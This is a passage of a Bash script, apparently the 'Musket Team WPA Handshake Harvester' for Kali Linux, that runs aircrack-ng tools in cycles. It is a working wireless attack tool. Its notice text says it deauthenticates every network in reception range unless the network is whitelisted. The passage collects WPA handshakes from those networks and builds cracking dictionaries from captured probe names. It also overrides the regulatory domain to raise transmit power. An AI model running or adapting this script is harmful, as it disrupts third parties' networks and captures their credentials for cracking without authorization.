cat < /tmp/ESSIDPROBE_DIR/essidprobesX8dic.txt | awk '{ print $1 }' | uniq -u >> /tmp/ESSIDPROBE_DIR/essidprobesiX18dic.txt

cat < /tmp/ESSIDPROBE_DIR/essidprobesX8dic.txt | awk '{ print $2 }' | uniq -u >> /tmp/ESSIDPROBE_DIR/essidprobesiX28dic.txt

cat < /tmp/ESSIDPROBE_DIR/essidprobesX8dic.txt | awk '{ print $3 }' | uniq -u >> /tmp/ESSIDPROBE_DIR/essidprobesiX38dic.txt

cat < /tmp/ESSIDPROBE_DIR/essidprobesX8dic.txt | awk '{ print $4 }' | uniq -u >> /tmp/ESSIDPROBE_DIR/essidprobesiX48dic.txt

cat < /tmp/ESSIDPROBE_DIR/essidprobesX8dic.txt | awk '{ print $5 }' | uniq -u >> /tmp/ESSIDPROBE_DIR/essidprobesiX58dic.txt

cat < /tmp/ESSIDPROBE_DIR/essidprobesX8dic.txt | awk '{ print $6 }' | uniq -u >> /tmp/ESSIDPROBE_DIR/essidprobesiX68dic.txt

cat < /tmp/ESSIDPROBE_DIR/essidprobesX8dic.txt | awk '{ print $7 }' | uniq -u >> /tmp/ESSIDPROBE_DIR/essidprobesiX78dic.txt

cat < /tmp/ESSIDPROBE_DIR/essidprobesX8dic.txt | awk '{ print $8 }' | uniq -u >> /tmp/ESSIDPROBE_DIR/essidprobesiX88dic.txt

cat < /tmp/ESSIDPROBE_DIR/essidprobesX8dic.txt | awk '{ print $9 }' | uniq -u >> /tmp/ESSIDPROBE_DIR/essidprobesiX98dic.txt

cat < /tmp/ESSIDPROBE_DIR/essidprobesX8dic.txt | awk '{ print $10 }' | uniq -u >> /tmp/ESSIDPROBE_DIR/essidprobesiX108dic.txt

cat /tmp/ESSIDPROBE_DIR/essidprobesi*.txt >> /tmp/ESSIDPROBE_DIR/essidprobes11dic.txt

cat /tmp/ESSIDPROBE_DIR/essidprobes11dic.txt | sed 's/^[ \t]*//;s/[ \t]*$//' > /tmp/ESSIDPROBE_DIR/essidprobes12dic.txt

echo "[+] Sorting essidprobes8dic.txt"

rm -f /tmp/ESSIDPROBE_DIR/essidprobesi*.txt

cat /tmp/ESSIDPROBE_DIR/essidprobes12dic.txt | awk 'length($0) > 7' > /tmp/ESSIDPROBE_DIR/essidprobes13dic.txt

cat /tmp/ESSIDPROBE_DIR/essidprobes13dic.txt |  sort -u  > /tmp/ESSIDPROBE_DIR/essidprobes14dic.txt

echo "[+] Transfering essidprobes8dic.txt to /root/PROBEESSID_DATA/"

cp -f /tmp/ESSIDPROBE_DIR/essidprobes14dic.txt /root/PROBEESSID_DATA/essidprobes8dic.txt 

sleep .2

}

#~~~~~~~~~~~~~~End ESSIDPROBE_fn End~~~~~~~~~~~~~~#

ESSIDREF_fn()

{
### essidreference ###


echo "[+] Writing ESSID Reference"
cat < /tmp/ESSIDPROBE_DIR/allcsv.txt | awk 'BEGIN { FS ="," } ; { if((length($6) == 18 )) {print $1 " " $6 " " $7 " " $8 " " $9 " " $10 " " $11 }}' | sed 's/^[ \t]*//;s/[ \t]*$//' | sed '/^$/d' > /tmp/ESSIDPROBE_DIR/essidrefhold01.txt

sleep 2

cp -f /root/PROBEESSID_DATA/essidrefhold.txt /tmp/ESSIDPROBE_DIR/essidrefhold03.txt

cat /tmp/ESSIDPROBE_DIR/essidrefhold01.txt >> /tmp/ESSIDPROBE_DIR/essidrefhold03.txt

sleep .2
 
cat /tmp/ESSIDPROBE_DIR/essidrefhold03.txt | sed 's/  / /g' | awk '{if(($3 != "")) {print $0 }}' >> /tmp/ESSIDPROBE_DIR/essidrefhold03c.txt

cat /tmp/ESSIDPROBE_DIR/essidrefhold03c.txt | awk '{if(($4 != "")) {print $0 }}' >> /tmp/ESSIDPROBE_DIR/essidrefhold03b.txt

cat /tmp/ESSIDPROBE_DIR/essidrefhold03b.txt | awk '{if(($3 != "")) {print $0 }}' >> /tmp/ESSIDPROBE_DIR/essidrefhold03a.txt
echo "[+] Writing ESSID Reference Sort"
cat /tmp/ESSIDPROBE_DIR/essidrefhold03a.txt | sort -u | uniq -u > /tmp/ESSIDPROBE_DIR/essidrefhold04.txt

sleep .2

rm -f /root/PROBEESSID_DATA/essidrefhold.txt

sleep .2

cp -f /tmp/ESSIDPROBE_DIR/essidrefhold04.txt /root/PROBEESSID_DATA/essidrefhold.txt

sleep .2

echo "[+] Copying any ESSID Probes obtained thru"
echo "[+] airodump-ng to the /root/PROBEESSID_DATA folder"

rm -f /tmp/ESSIDPROBE_DIR/*.csv

sleep 3

}

#~~~~~~~~~~~~~~End ESSIDPROBE_fn End~~~~~~~~~~~~~~#

white_ap_mac_fn()
{

WHITELTEST=ZZZ

clear

until  [ $WHITELTEST == y ] || [ $WHITELTEST == Y ]; do  


echo ""
echo ""
echo -e "$info$bold  $undr White Listing Networks $txtrst"
echo ""


echo -e "$info     This script will deauth ALL Networks within the reception range"
echo -e "  of the wifi device. You can White-List any network and that network will"
echo -e "  not undergo deauthorization from aireplay-ng -0. Mac addresses of those"
echo -e "  networks you wish to white-list will be required."
echo ""
echo -e "$inp     If you wish to whitelist any networks. Enter$yel (y/Y)$q."
echo -e "$inp  Enter$yel (n/N)$inp to not use the feature.$txtrst"
read WHITEL

	if [[ $ERRORCHK == n ]] || [[ $ERRORCHK == N ]]; then

	WHITELTEST=y

	else

	while true
	do

   echo ""
   echo -e  "$inp      You entered$yel $WHITEL$inp  Select$yel (y/Y)$inp to continue."
   echo -e  "$inp  Select$yel (n/N)$inp to try again.$txtrst"
read WHITELTEST

	case $WHITELTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

	done

	fi

	clear
		done

if  [ $WHITEL == y ] || [ $WHITEL == Y ]; then

whitelist=$(ls -A1 /root/HANDSHAKEHOLD/* | xargs -n 1 basename | dos2unix | awk -F "-" '/whitelist/ {print $1 "-" $2 }')  # > /tmp/HANDTEST/whitelist

                 if [[ -z $whitelist ]]; then
	echo ""
	echo -e "$info    There are currently no APs whitelisted."

		else

	echo ""
	echo -e "$info    APs currently whitelisted are seen below. If you wish to"
	echo -e "$info  remove any whitelisted APs open the$yel /root/HANDSHAKEHOLD"
	echo -e "$info  folder and erase the whitelist file from the folder.$txtrst"
	echo ""
	echo "$whitelist"

			fi

	echo ""
	echo -e "$inp    Enter the mac address of the device you wish to White-List."
        echo -e "$inp  Enter in this format$yel 55:44:33:22:11:00$inp ONLY!!!"
        echo ""
        echo -e "$info Some error handeling exists for this entry.$txtrst"
	read ap_mac

			white_ap_mac_test_fn

		fi

}

#~~~~~~~~~~~~~~~Start  Mac Error Handling Star~~~~~~~~~~~~~~~#

white_ap_mac_test_fn()

{

# Error Handling For Mac Code Entries
# Tests Length of string
# Tests  Presence of only ::::: punctuation characters
# Tests only hex charcters present
#Sets correct puntuation for test

MACPUNCT=":::::"

sleep .2

#Tests punctuation

PUNCTEST=`echo "$ap_mac" | tr -d -c ".[:punct:]"`

sleep .2

if [ "$PUNCTEST" == "$MACPUNCT" ]

	then

	    PUNCT=1

	else

	    PUNCT=0

	fi

sleep .2

#Tests hex characters

MACALNUM=`echo "$ap_mac" | tr -d -c ".[:alnum:]"`

sleep .2

if [[ $MACALNUM =~ [A-Fa-f0-9]{12} ]]

then

	ALNUM=1
else

	ALNUM=0
  fi

sleep .2

#Tests string length

if [ ${#ap_mac} = 17 ]

then

	MACLEN=1
else

	MACLEN=0
  fi

sleep .2

# All variables set to ones  and zeros

until [ $MACLEN == 1 ] && [ $PUNCT == 1 ] && [ $ALNUM == 1 ]; do

	if [ $ALNUM == 0 ]; then
		echo -e "$warn  You are using a non-hex character.$txtrst"

			fi
	
	if [ $MACLEN == 0 ]; then
		echo -e "$warn  Your Mac code is the wrong length.$txtrst"

			fi

	if [ $PUNCT == 0 ]; then

		echo -e "$warn  You have entered the wrong and/or too many separators - use ONLY colons :$txtrst"

			fi

	echo -e "$info  Mac code entry incorrect!!!"
        echo "  You must use format 00:11:22:33:44:55 or aa:AA:bb:BB:cc:CC"
	echo "  Only a thru f, A thru F, 0 thru 9 and the symbol :  are allowed."
	echo -e "$inp  Reenter Mac code and try again(ap_mac).$txtrst"
	read ap_mac

        MACALNUM=`echo "$ap_mac" | tr -d -c ".[:alnum:]"`
	if [[ $MACALNUM =~ [A-Fa-f0-9]{12} ]]

        then

        	ALNUM=1

        else

	        ALNUM=0

			fi

sleep .2       

	if [ ${#ap_mac} == 17 ]

	then

		MACLEN=1
	else

		MACLEN=0

			fi

sleep .2

	PUNCTEST=`echo "$ap_mac" | tr -d -c ".[:punct:]"`
	if [ $PUNCTEST == $MACPUNCT ]

	then

	    PUNCT=1

	else

	    PUNCT=0

			fi

sleep 1

done

echo $ap_mac > /root/HANDSHAKEHOLD/$ap_mac-whitelist
sleep 1

echo -e "$inp     Enter$yel (y/Y)$inp to white list another device."
echo -e "$inp  Enter$yel (n/N)$inp to continue to main program.$txtrst"
read ANOTHER

		if  [[ $ANOTHER == y ]] || [[ $ANOTHER == y ]]; then

				white_ap_mac_fn #loop for another check

					fi

}
#~~~~~~~~~~~~~~~Ends Mac Error Handling Ends~~~~~~~~~~~~~~~#

#~~~~~~~~~~~~~~~Select Monitor~~~~~~~~~~~~~~~#

SELECT_MONITOR_fn()
{

airmon-ng start $DEV &> /dev/null

sleep 1
MONTEST=ZZZ
until  [ $MONTEST == y ] || [ $MONTEST == Y ]; do

echo -e  "$txtrst"
airmon-ng | tee airmon01.txt

cat < airmon01.txt | awk -F' ' '{ if(($1 != "Interface")) {print $1}}' > airmon02.txt

cat < airmon02.txt | awk -F' ' '{ if(($1 != "")) {print $1}}' > airmon03.txt

  AIRMONNAME=$(cat airmon03.txt | nl -ba -w 1  -s ': ')

echo ""
echo -e "$info Devices found by airmon-ng.$txtrst"
echo " "
echo "$AIRMONNAME" | sed 's/^/       /'
echo ""
echo -e "$q    What wireless monitor interface$yel (i.e. mon0, mon1)$q will"
echo -e "  be used by reaver?$txtrst"
echo ""
read  -p "   Enter Line Number Here: " grep_Line_Number

echo -e "$txtrst"
MON=$(cat airmon03.txt| sed -n ""$grep_Line_Number"p")

# Remove trailing white spaces leaves spaces between names intact

MON=$(echo $MON | xargs)

rm -f airmon01.txt
rm -f airmon02.txt
rm -f airmon03.txt

	if [[ $ERRORCHK == n ]] || [[ $ERRORCHK == N ]]; then

	MONTEST=y

	else

	while true
	do

echo ""
echo -e "$inp  You entered$yel $MON$info type$yel (y/Y)$inp to confirm or$yel (n/N)$inp to try again.$txtrst"
read MONTEST

	case $MONTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

	done

		fi

			done

        clear
}
#~~~~~~~~~~~~~~~End Select Monitor End~~~~~~~~~~~~~~~#

handshakecollect()

{

number_of_files=$(ls -A /root/HANDSHAKEHOLD | wc -l)

if [ "$number_of_files" != 0 ]; then

sleep 3

ls -1 /root/HANDSHAKEHOLD/* | xargs -n1 basename | sed 's/-.*//' | dos2unix | tr [a-f] [A-F] | awk '{a [$1]++}! (a[$1]-1)' | cat > /tmp/HANDTEST/caplist.txt 2> /dev/null

# Place in array

sleep 2

readarray bssidcaplist < /tmp/HANDTEST/caplist.txt

bssidvar=0
macadd=$(echo $BSSIDS |awk '{ print $'$numi1' }')
apname=$(echo $SSIDS |awk '{ print $'$numi1' }')
arrayqty=${#bssidcaplist[@]}
arraycnt=0

until [[  $arraycnt -eq ${#bssidcaplist[@]} ]] || [[ $(echo ${bssidcaplist[$bssidvar]} | xargs | sed -e  's/^\(.\{17\}\).*$/\1/') == $macadd ]] || [[  $numi1 == 0 ]] ; do

	echo -e "$txtrst[+]"
	echo "[+] Starting test looking for cap files for $apname."
#	echo "[+] Checking /root/HANDSHAKEHOLD for $bssid.cap files."
	echo "[+] Checking /root/HANDSHAKEHOLD for $macadd.cap files."
	echo -e "$txtrst[+]" 
	echo "."
	sleep .1
	echo ".."
	sleep .1	
	echo "..."
	sleep .1
	echo "...."
	sleep .1
	echo "....."
	let bssidvar=$bssidvar+1
        let arraycnt=$arraycnt+1
done

if [[ $(echo ${bssidcaplist[$bssidvar]} | xargs | sed -e  's/^\(.\{17\}\).*$/\1/') == $macadd ]] && [[ $numi1 -gt 1 ]]; then

	numi1=$(expr "$numi1" - 1)
	echo "[+] Handshake file for $apname FOUND!"
	echo "[+] Skipping mac address $macadd."
	sleep 3	

		handshakecollect
     

			fi

if [[ $(echo ${bssidcaplist[$bssidvar]} | xargs | sed -e  's/^\(.\{17\}\).*$/\1/') == $macadd ]] && [[ $numi1 -eq 1 ]]; then

          echo "[+] Handshake file for $apname FOUND!"
		sleep 3
    			 passive_scan

            fi

		fi

}

passive_scan()

{

killall -q airodump-ng &>dev\null
sleep .2
killall -q aireplay-ng &>dev\null
sleep .2
killall -q xterm &>dev\null

	if [[ "$airmontype" == "Interface" ]]; then

	airmon-ng stop $monitor &>dev\null

	ifconfig $DEV down &>dev\null

	ifconfig $DEV up &>dev\null

	airmon-ng start $DEV &>dev\null

		fi

	if [[ "$airmontype" != "Interface" ]]; then

	ifconfig $DEV down
	iwconfig $DEV mode monitor
	ifconfig $DEV up


		fi

ESSIDNAME=

killall -q airodump-ng &>dev\null
sleep .2
killall -q aireplay-ng &>dev\null
sleep .2
killall -q xterm &>dev\null
sleep .2
killall -q Eterm &>dev\null

#wpsavail=$(airodump-ng --help | grep -- wps | awk '{print $1}')

if [[ $wpsavail == --wps ]]; then

xterm -g 95x15-1+100 -T "Airodump-ng Passive Scan" -e "airodump-ng --wps --berlin 10000000 --beacons -w /tmp/HANDTEST/allchan $monitor" 2> /dev/null & passcan=$!

else 

xterm -g 95x15-1+100 -T "Airodump-ng Passive Scan" -e "airodump-ng -w /tmp/HANDTEST/allchan $monitor" 2> /dev/null & passcan=$!

	fi

#Eterm -g 80x15-1+100 --cmod "red" -T "Airodump-ng Passive Scan" -e sh -c "airodump-ng -w /tmp/HANDTEST/allchan $monitor" 2> /dev/null &

clear

echo ""
echo ""
echo -e "$yel ***$info Entering Passive All Channel Scan With Airodump-ng$yel ***$txtrst"
echo ""
echo -e "     If valid handshake file found, it will be placed in the"
echo -e "   /root/HANDSHAKEHOLD/ folder as a passive time-stamped .cap file."
echo ""
seconds=$PAUSE; date1=$((`date +%s` + $seconds)); 
while [ "$date1" -ne `date +%s` ]; do 
echo -ne "$info  Time before program restart $yel $(date -u --date @$(($date1 - `date +%s` )) +%H:%M:%S)\r"; 
	
	done

echo -e "$txtrst"

	kill $passcan 2>/dev\null
	killall -q airodump-ng &>dev\null
        killall -q aireplay-ng &>dev\null 
	killall -q xterm &>dev\null

	ESSIDNAME=$(wpaclean /tmp/HANDTEST/allchan-01a.cap /tmp/HANDTEST/allchan-01.cap | awk -F ' ' '{if ($1 == "Net"){ print $3 }}')

		if [ ! -z $ESSIDNAME ]; then
    		echo "[+] !!!Handshake(s) Found in passive scan!!!"
		DATEFILE=$(date +%y%m%d-%H:%M)
		cp /tmp/HANDTEST/allchan-01.cap /root/HANDSHAKEHOLD/"passivescan-$DATEFILE.cap"
		sleep 3

			fi

	let COUNT=COUNT-1


#countcsv1=`ls -1 /root/*.csv 2>/dev/null | wc -l`

#echo "1068 debug /root/*.csv $countcsv1"

#	if [[ $countcsv1 != 0 ]]; then

#		cp -f /root/*.csv /tmp/ESSIDPROBE_DIR/ 2>/dev/null

#			fi

countcsv1=`ls -1 /tmp/HANDTEST/*.csv 2>/dev/null | wc -l`
#echo "1078 debug /root/*.csv $countcsv1"

	if [[ $countcsv1 != 0 ]]; then

		cp -f /tmp/HANDTEST/*.csv  /tmp/ESSIDPROBE_DIR/ 2>/dev/null
		sleep 1
		rm -f /tmp/HANDTEST/*


			fi

	if [ -f "/tmp/ESSIDPROBE_DIR/*.csv" ]; then

		echo "[+]"
		echo "[+] Moving any possible WPA keys in clear text to" 
		echo "[+]   /root/PROBEESSID_DATA/essidprobesdic.txt"
		echo "[+] for use with aircrack-ng,pyrite or elcomsoft."
		echo "[+]"	
		sleep 3

	if [[ $USE_PROBE == y || $USE_PROBE == Y ]]; then

		ESSIDPROBE_fn

			fi

	if [[ $USE_REF == y || $USE_REF == Y ]]; then

		ESSIDREF_fn

			fi

		fi

	echo -e "[+] New scan of existing APs within reception range to begin."
	sleep 3

	if [[ "$airmontype" == "Interface" ]]; then

	airmon-ng stop $monitor &>dev\null

	ifconfig $DEV down &>dev\null

	ifconfig $DEV up &>dev\null

		fi

 if [[ "$airmontype" != "Interface" ]]; then 

	ifconfig $DEV down &>dev\null
	iwconfig $DEV mode manage &>dev\null
	ifconfig $DEV up &>dev\null

  		   fi

    killall -q airodump-ng &>dev\null
    killall -q aireplay-ng &>dev\null  
    killall -q xterm &>dev\null

		prepare_fn

}

exit_fn()
{

    echo -e "$txtrst"	
    echo -e "[+] removing programs"
    killall -q airodump-ng &>dev\null
    killall -q aireplay-ng &>dev\null
    killall -q airbase-ng aireplay-ng ferret hamster sslstrip # stop processes
    killall -q Eterm &>dev\null
    killall -q xterm &>dev\null
    sleep 2

 if [[ "$airmontype" == "Interface" ]]; then

    echo -e "$txrst"
    echo -e "[+] stopping monitor @ $monitor...."
    airmon-ng stop $monitor &>dev\null # stop monitor
	ifconfig $DEV up # pull up interface
	service NetworkManager start # start the network manager
	sleep 2 

	fi

if [[ "$airmontype" != "Interface" ]]; then

    echo -e "$txrst"
    echo -e "[+] stopping monitor @ $monitor...."
    airmon-ng stop $monitor &>dev\null # stop monitor
    ifconfig $DEV down
    iwconfig $DEV mode manage
    ifconfig $DEV up

    sleep 2	

	fi


	echo -e "$txrst"
	echo -e "[+] Happy Trails From Musket Teams."
	exit 0
}

trap exit_fn INT # trap exit

# ~~~~~~~~~~  Environment Setup ~~~~~~~~~~ #

# Text color variables - saves retyping these awful ANSI codes

txtrst="\e[0m"      # Text reset
def="\e[1;34m"	    # default 		   blue
warn="\e[1;31m"     # warning		   red
info="\e[1;34m" 	# info             blue
q="\e[1;32m"		# questions        green
inp="\e[1;36m"	    # input variables  magenta
yel="\e[1;33m"      # typed keyboard entries
ital="\e[3m"	    # italic
norm="\e[0m"        # normal
bold="\e[1m"        # bold
undr="\e[4m"       # underline
#  ANSI coding all thanks to Vulpi author of Pwnstar9.0

# Default values
USE_PROBE=y
USE_REF=n

################################
clear
echo ""
echo -e "handshakeharvest-K1-K2-K2016-4-0.sh"
echo -e "$yel                   ***************************************"
echo -e "$yel                   *$info Musket Team WPA Handshake Harvester$yel *"
echo -e "$yel                   ***************************************"
echo ""
echo -e "$warn                 !!!!FOR USE by the KALI-LINUX Community!!!!"
echo ""
echo -e "$info                          In Memory of Dorthy Hunt"
echo -e "$info                         United Airlines Flight 553"
echo -e "$info"
echo -e "$info                      ALL THANKS to:"
echo -e "$yel                                Nadav Cohen"
echo -e "$info                      Who's Work Showed Us An Easier Way"     
echo -e "$info                                    And"
echo -e "$yel                                Liam Scheff"
echo -e "$info                         Author of Offical Stories"
echo -e "$info                         May His Insights Continue"
echo -e ""
echo -e "$info     Debugging and program additions thanks to$yel MajorTom$info."
echo ""
echo -e "$info     This program supports kali 1.1, kali 2.0 and Kali 2016 R. If kali 1.1 is"
echo -e "$info  used, uncheck Enable Networking thru Network Manager menu, right-hand corner" 
echo -e "$info  of screen. Ensure Enable Wireless is selected, or a RF kill error may result."

while true

do
echo -e "$inp                              Press $yel(y/Y)$inp to continue...."
echo -e "         Press $yel(n/N)$inp to abort!!..Press any other key to try again:$txtrst"

  read CONFIRM
  case $CONFIRM in
    y|Y|YES|yes|Yes) break ;;
    n|N|no|NO|No)
      echo Aborting - you entered $CONFIRM
      exit
      ;;

	  esac

		done

echo -e "$info  You entered $CONFIRM.  Continuing ...$txtrst"
sleep 3

clear

#
# Allow reduction of error handeling
ERRORCHK_fn




#Test for ifconfig type ext output
IFCONFIG_TYPE_fn

########### Decide kali type

KALI_L_fn()

{
KALI_TYPETEST=ZZZ

until [ $KALI_TYPETEST == y ] || [ $KALI_TYPETEST == Y ]; do  

echo ""
echo ""
echo -e "$info$bold  $undr Kali-Linux Operating System $txtrst"
echo -e ""

echo -e "$inp     Select the Kali-Linux Program Being Used."
echo ""
echo ""
echo -e "$inp     Enter$yel (1)$inp if you are using Kali 1."
echo -e "$inp  Enter$yel (2)$inp if you are using Kali 2..$txtrst"
echo -e "$inp  Enter$yel (3)$inp if you are using Kali 2016 Rolling..$txtrst"
echo -e ""	
	read KALI_TYPE

	if [[ $ERRORCHK == n ]] || [[ $ERRORCHK == N ]]; then

		KALI_TYPETEST=y

	else

	while true
	do

   echo ""
   echo -e  "$inp      You entered$yel $KALI_TYPE$inp  Select$yel (y/Y)$inp to continue."
   echo -e  "$inp  Select$yel (n/N)$inp to try again.$txtrst"
	read KALI_TYPETEST

	case $KALI_TYPETEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

	done

	fi

	clear
		done

}

#~~~~~~~~~~~~~~Start Select to attack WPS locked routers Start~~~~~~~~~~~~~~#

###########

KALI_L_fn

DEVTEST=ZZZ

#/tmp/ESSIDPROBE_DIR="/tmp/ESSIDPROBE_DIR"

rm -f /tmp/HANDTEST/*
rm -f /tmp/ESSIDPROBE_DIR/*

#Make dir to test for ESSID

if [ ! -d "/tmp/ESSIDPROBE_DIR" ]; then

	mkdir -p -m 700 /tmp/ESSIDPROBE_DIR;

	fi

#Make dir to test for handshake

if [ ! -d /tmp/"HANDTEST" ]; then

    mkdir -p -m 700 /tmp/"HANDTEST";

	fi

if [ ! -d "HANDSHAKEHOLD" ]; then

    mkdir -p -m 700 "HANDSHAKEHOLD";

	fi

#Make hold file in /tmp file

if [ ! -d "/root/PROBEESSID_DATA" ]; then

	mkdir -p -m 700 /root/PROBEESSID_DATA;

	fi

if [ ! -f "/root/PROBEESSID_DATA/essidprobesdic.txt" ]; then

	touch /root/PROBEESSID_DATA/essidprobesdic.txt

	fi

if [ ! -f "/root/PROBEESSID_DATA/essidrefhold.txt" ]; then

	touch /root/PROBEESSID_DATA/essidrefhold.txt

	fi

# Copy any .csv files found in root

countcsv1=`ls -1 /root/*.csv 2>/dev/null | wc -l`

#echo "1361 debug /root/*.csv $countcsv1"

	if [[ $countcsv1 != 0 ]]; then

		echo "[+] Copying .csv files from root /tmp/ESSIDPROBE_DIR/."
		cp -f /root/*.csv /tmp/ESSIDPROBE_DIR/ 2>/dev/null

			fi

SELECT_DEVICE_fn()
{

until  [ $DEVTEST == y ] || [ $DEVTEST == Y ]; do

airmon-ng | cat > /tmp/airmontype.txt

airmontype=$(cat < /tmp/airmontype.txt | awk -F' ' '{ if(($2 == "Interface")) {print $2}}')

if [[ "$airmontype" != "Interface"  ]]; then

      airmontype=ZZZ
      airmon-ng stop mon10 &>dev\null
      airmon-ng stop mon9 &>dev\null
      airmon-ng stop mon8 &>dev\null
      airmon-ng stop mon7 &>dev\null
      airmon-ng stop mon6 &>dev\null
      airmon-ng stop mon5 &>dev\null
      airmon-ng stop mon4 &>dev\null
      airmon-ng stop mon3 &>dev\null
      airmon-ng stop mon2 &>dev\null
      airmon-ng stop mon1 &>dev\null
      airmon-ng stop mon0 &>dev\null

	fi

 if [[ "$airmontype" == "Interface" ]]; then

	airmon-ng stop wlan10mon  &>dev\null
	airmon-ng stop wlan9mon  &>dev\null
	airmon-ng stop wlan8mon  &>dev\null
	airmon-ng stop wlan7mon  &>dev\null
	airmon-ng stop wlan6mon  &>dev\null
	airmon-ng stop wlan5mon  &>dev\null
	airmon-ng stop wlan4mon  &>dev\null
	airmon-ng stop wlan3mon  &>dev\null
	airmon-ng stop wlan2mon  &>dev\null
	airmon-ng stop wlan1mon  &>dev\null
	airmon-ng stop wlan0mon  &>dev\null

echo -e  "$txtrst"

airmon-ng | tee airmon01.txt 

cat < airmon01.txt | awk -F' ' '{ if(($2 != "Interface")) {print $2}}' > airmon02.txt

cat < airmon02.txt | awk -F' ' '{ if(($1 != "")) {print $1}}' > airmon03.txt

  AIRMONNAME=$(cat airmon03.txt | nl -ba -w 1  -s ': ')

		fi

if [[ "$airmontype" != "Interface" ]]; then

echo -e  "$txtrst"
airmon-ng | tee airmon01.txt

cat < airmon01.txt | awk -F' ' '{ if(($1 != "Interface")) {print $1}}' > airmon02.txt

cat < airmon02.txt | awk -F' ' '{ if(($1 != "")) {print $1}}' > airmon03.txt


#cat < airmon01.txt | awk -F' ' '{ if(($2 != "Interface")) {print $2}}' > airmon02.txt

#cat < airmon02.txt | awk -F' ' '{ if(($1 != "")) {print $2}}' > airmon03.txt

  AIRMONNAME=$(cat airmon03.txt | nl -ba -w 1  -s ': ')

		fi

echo ""
echo -e "$info Devices found by airmon-ng.$txtrst"
echo " "
echo "$AIRMONNAME" | sed 's/^/       /'
echo ""
echo -e "$inp     Enter the$yel line number$inp of the wireless device$yel (i.e. wlan0, wlan1 etc)$inp"
echo -e "  to be used."
echo -e "$warn  Device must support packet injection.$txtrst"
echo ""
read  -p "  Enter Line Number Here: " grep_Line_Number

echo -e "$txtrst"
DEV=$(cat airmon03.txt| sed -n ""$grep_Line_Number"p")

# Remove trailing white spaces leaves spaces between names intact

DEV=$(echo $DEV | xargs)

rm -f airmon01.txt
rm -f airmon02.txt
rm -f airmon03.txt

	if [[ $ERRORCHK == n ]] || [[ $ERRORCHK == N ]]; then

		DEVTEST=y

	else

	while true
	do

echo ""
echo -e "$inp  You entered$yel $DEV$info type$yel (y/Y)$inp to confirm or$yel (n/N)$inp to try again.$txtrst"
read DEVTEST

	case $DEVTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

	done

	fi

		done

clear

}

#~~~~~~~~~~~~~~~End Select Device End~~~~~~~~~~~~~~~#

#~~~~~~~~~~~~~~~Boost Device~~~~~~~~~~~~~~~#

BOOST_DEVICE_fn()
{
ifconfig $DEV down
sleep .1
iwconfig $DEV mode managed
sleep .1
ifconfig $DEV up

clear
	while true
	do

echo ""
echo -e "$q    Do you wish to boost your wifi device power to 30dBm?"
echo -e "$info  This routine works for the AWUSO36H and" #(AWUSO)
echo -e "$info  may work with other devices."
echo -e "$inp  Type$yel (y/Y)$inp for yes or$yel (n/N)$inp for no.$txtrst"
		read AWUSO
		case $AWUSO in
		y|Y|n|N) break ;;
		~|~~)
		echo Aborting -
		exit
		;;

		esac
		echo -e  "$warn !!!Wrong input try again!!!$txtrst"

			done

	if [ $AWUSO == y ] || [ $AWUSO == Y ]; then

		ifconfig $DEV down
		sleep 1
		iw reg set GY
		ifconfig $DEV up
		iwconfig $DEV channel 13
		iwconfig $DEV txpower 30

        	sleep 2
 
			fi

clear

}

#~~~~~~~~~~~~~~~End Boost Device End~~~~~~~~~~~~~~~#


SELECT_DEVICE_fn


if [[ "$airmontype" != "Interface" ]]; then

SELECT_MONITOR_fn

	fi

COUNTTEST=ZZZ

until [ $COUNTTEST == y ] || [ $COUNTTEST == Y ]; do  

clear

echo ""
echo ""
echo -e "$info$bold  $undr Program Cycles $txtrst"
echo -e ""
echo -e "$info     One(1) Program Cycle is composed of two(2) parts:"
echo -e "  Part I is an active scan of all targetAPs seen using deauth processes."
echo -e "  Part II is a passive scan of all channels - airodump-ng silently"
echo -e "  collects data."
echo -e ""
echo -e "$q  How many program cycle(s) do you wish to use?$txtrst"
read COUNT

	if [[ $ERRORCHK == n ]] || [[ $ERRORCHK == N ]]; then

	COUNTTEST=y
	
	else

	while true

	do

echo ""
echo -e "$inp  You entered$yel $COUNT$inp cycle(s), type$yel (y/Y)$inp to confirm or$yel (n/N)$inp to try again.$txtrst"
	read COUNTTEST

	case $COUNTTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e "$warn  !!!Wrong input try again!!!$txtrst"

	done

	fi
		done

###############
PAUSETEST=ZZZ

until [ $PAUSETEST == y ] || [ $PAUSETEST == Y ]; do  

clear

echo ""
echo -e "$info$bold  $undr Pause Time  $txtrst"
echo -e ""
echo -e "$info     The program first scans for existing APs, then attempts to"
echo -e "  induce the collection of a handshake from each WPA encrypted AP"
echo -e "  found during the scan."

echo -e "$info     Once all targets have undergone an aireplay-ng deauth process,"
echo -e "  the program enters the passive scan mode, to avoid constantly disrupt-"
echo -e "  ing networks thru active DDOS processes."
echo -e "$info     During the passive phase, a countdown timer will be seen. When"
echo -e "  the passive phase ends, the program rescans all channels for WPA encryp-"
echo -e "  ed targets and recommences another active scan in an attempt to force"
echo -e "  handshake production using aireplay-ng --deauth."
echo -e "     For both active and passive scans .cap files are collected and tested"         
echo -e "  for handshakes. If WPA handshakes are found within these files, the file"
echo -e "  is moved to the$yel /root/HANDSHAKEHOLD$info folder."
echo -e "     If a handshake has been collected from a target, all subsequent"
echo -e "  active scans will skip this target if the .cap file is found in the"
echo -e "  /root/HANDSHAKEHOLD folder."

echo -e "$q     How long in$yel MINUTE(S)$q do you want the program to pause in the"
echo -e "  passive scan mode. A 15 to 30 minute passive scan is suggested.$txtrst"

read PAUSE

	if [[ $ERRORCHK == n ]] || [[ $ERRORCHK == N ]]; then

	PAUSETEST=y

	else

	while true

	do

echo ""
echo -e "$inp  You entered$yel $PAUSE$inp minute(s) type$yel (y/Y)$inp to confirm or$yel (n/N)$inp to try again.$txtrst"
	read PAUSETEST

	case $PAUSETEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e "$warn  !!!Wrong input try again!!!$txtrst"

	done

		fi

			done

# Change to Seconds for sleep
